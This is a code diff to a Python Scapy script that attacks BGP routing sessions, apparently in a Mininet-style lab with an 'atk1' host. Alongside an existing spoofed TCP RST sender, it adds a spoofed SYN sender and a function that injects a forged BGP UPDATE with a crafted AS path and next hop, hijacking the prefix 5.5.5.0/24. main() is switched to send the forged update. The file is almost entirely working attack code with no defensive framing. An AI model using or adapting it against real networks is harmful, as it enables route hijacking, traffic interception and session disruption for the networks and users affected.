@@ -7,6 +7,9 @@ import ctypes
 
 from subprocess import Popen, PIPE
 from scapy.all import *
+from random import randint
+
+load_contrib("bgp")
 
 
 SOURCE_ADDRESS = '9.0.1.2'
@@ -27,7 +30,64 @@ def send_rst_packet(iface, srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, seqNu
 	tcp.ack=int(ackNum)
 	tcp.window=int(win)
 
-	spoofed_packet = IP(dst=dstIP, src=srcIP, ttl=255)/tcp
+	spoofed_packet = IP(dst=dstIP, src=srcIP, ttl=1)/tcp
+
+	frame = Ether(src=srcMac, dst=dstMac)/spoofed_packet
+
+	frame.display()
+
+	sendp(frame, iface=iface)
+
+
+def send_syn_packet(iface, srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, seqNum, ackNum, win):
+	log('sending SYN packet\n%s:%s -> %s:%s SN %s AN %s' % (srcIP, srcPort, dstIP, dstPort, seqNum, ackNum), 'red')
+
+	# swapping ports
+	srcPort, dstPort = dstPort, srcPort
+
+	tcp = TCP(flags="S")
+	tcp.sport=int(srcPort)
+	tcp.dport=int(dstPort)
+	#tcp.sport=179
+	#tcp.dport=randint(1025,65535)
+	tcp.seq=0
+	tcp.ack=0
+	tcp.window=int(win)
+
+	spoofed_packet = IP(dst=dstIP, src=srcIP, ttl=1)/tcp
+
+	frame = Ether(src=srcMac, dst=dstMac)/spoofed_packet
+
+	frame.display()
+
+	sendp(frame, iface=iface)
+
+
+def send_update_packet(iface, srcMac, dstMac, srcIP, srcPort, dstIP, dstPort, seqNum, ackNum, win):
+
+	srcPort=int(srcPort)
+	dstPort=int(dstPort)
+	seqNum=int(seqNum)
+	ackNum=int(ackNum)
+
+	paORIGIN = BGPPathAttribute(flags = 0x40, type = 1, attr_len = 1, value = '\x00')
+
+	# PathAttribute [AS -SEQ (2)][ ASN# (1)][ ASN (300)]
+	#paAS = BGPPathAttribute(flags = 0x40, type = 2, attr_len = 4, value = '\x02\x01\x00\x03')
+	paAS = BGPPathAttribute(flags = 0x50, type = 2, attr_len = 6, value = '\x02\x01\x00\x00\x00\x03')
+
+	# Path Next Hop [IP (9.0.1.2)]
+	paNEXTHOP = BGPPathAttribute(flags = 0x40 , type = 3, attr_len = 4, value = '\x09\x00\x01\x02')
+
+	# Multiple Exit Discriminator [0000]
+	paMED= BGPPathAttribute(flags = 0x80 , type = 4, attr_len = 4, value = '\x00\x00\x00\x00')
+
+	paBGPU = BGPUpdate(tp_len = 28, total_path = [paORIGIN , paAS , paNEXTHOP, paMED], nlri = [(24 , '5.5.5.0')])
+
+	spoofed_packet = IP(dst = dstIP, src = srcIP, ttl = 255)/\
+		TCP(dport = dstPort, sport = srcPort, flags = "PA", seq = seqNum, ack = ackNum)/\
+		BGPHeader(len = 55, type = 2)/\
+		paBGPU
 
 	frame = Ether(src=srcMac, dst=dstMac)/spoofed_packet
 
@@ -156,7 +216,11 @@ def main():
 	print 'acknowledge number', ackNum
 	print 'window', win
 
-	send_rst_packet('atk1-eth1', src_mac_address, dst_mac_address, SOURCE_ADDRESS, srcPort, DESTINATION_ADDRESS, dstPort, seqNum, ackNum, win)
+	#send_rst_packet('atk1-eth1', src_mac_address, dst_mac_address, SOURCE_ADDRESS, srcPort, DESTINATION_ADDRESS, dstPort, seqNum, ackNum, win)
+
+	#send_syn_packet('atk1-eth1', src_mac_address, dst_mac_address, SOURCE_ADDRESS, srcPort, DESTINATION_ADDRESS, dstPort, seqNum, ackNum, win)
+
+	send_update_packet('atk1-eth1', src_mac_address, dst_mac_address, SOURCE_ADDRESS, srcPort, DESTINATION_ADDRESS, dstPort, seqNum, ackNum, win)
 
 
 if __name__ == "__main__":
